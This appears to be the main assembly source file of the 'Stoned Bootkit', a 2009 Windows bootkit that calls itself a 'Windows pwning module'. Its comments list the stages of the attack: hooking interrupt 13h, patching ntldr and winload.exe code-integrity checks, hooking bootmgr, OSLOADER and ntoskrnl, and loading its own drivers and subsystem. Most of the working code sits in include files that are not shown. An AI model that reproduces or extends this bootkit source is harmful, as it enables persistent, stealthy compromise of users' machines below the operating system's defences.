
; Windows pwning module

;   Boot Application of Stoned Bootkit
;   Version 0.1 from 18.06.2009 11:12

;   (C) 2009 Peter Kleissner


[bits 16]                                       ; create a 16 Bit Code
CPU 386                                         ; Assemble instructions up to the 386 instruction set

%include "Module Functions.asm"
%include "Kernel Storage.asm"
%include "Errors.asm"

; small header
jmp Exeute_Windows_Bootkit      ; entry point
dd Driver_Loading_Table         ; symbol @Driver_Loading_Table

Exeute_Windows_Bootkit:


; Bootkit Real Mode           Relocates code to end of memory (4 KB)
;                             Hooks Interrupt 13h
;                             Patches ntldr code integrity verification
;                             Hooks OSLOADER (XP)
;                             Hooks bootmgr (Vista)
; Bootkit Protected Mode      Hooks OSLOADER (Vista)
;                             Patches winload.exe ntoskrnl image verification (Vista)
;                             Hooks ntoskrnl
;                             Relocates the code to ntoskrnl image
; Kernel Code                 Gets ntoskrnl base and PsLoadedModuleList, resolves own imports
; Driver Code                 Loads, relocates, resolves, executes all drivers in the list
; PE Loader                   Responsible for relocating and resolving
; Subsystem                   The Stoned subsystem installed into Windows


%include "Bootkit Real Mode.asm"
%include "Bootkit Protected Mode.asm"
%include "Kernel Code.asm"
%include "Driver Code.asm"
%include "PE Loader.asm"
%include "Subsystem.asm"


Total_End_of_Binary:

